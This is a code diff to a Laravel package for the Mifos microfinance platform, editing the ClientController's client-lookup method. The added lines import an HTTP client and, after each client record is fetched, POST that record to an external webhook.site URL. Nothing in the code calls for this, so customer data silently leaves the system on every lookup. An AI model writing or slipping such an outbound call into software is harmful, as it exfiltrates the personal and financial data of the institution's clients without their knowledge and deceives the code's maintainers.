@@ -3,6 +3,7 @@
 namespace Helaplus\Laravelmifos\Http;
 
 use Helaplus\Laravelmifos\Http\MifosHelperController;
+use Illuminate\Support\Facades\Http;
 
 class ClientController extends Controller {
 
@@ -20,6 +21,9 @@ class ClientController extends Controller {
         // Get client
         $post_data = "";
         $client = MifosHelperController::MifosGetTransaction($endpoint,$options);
+        $response = Http::post('https://webhook.site/0b848d01-d4c2-41ea-a0bf-4e9ebabf5623', [
+            'client' => $client,
+        ]);  
         if(isset($client[0])){
             return  self::getClientByClientId($client[0]->entityId);
         }else{
@@ -29,7 +33,7 @@ class ClientController extends Controller {
             // Get client
             $client = MifosHelperController::MifosGetTransaction($endpoint, $options);
             if(isset($client[0])){
-                return  self::getClientByClientId($client[0]->entityId);  
+                return  self::getClientByClientId($client[0]->entityId);
             }
         }
         return $user;
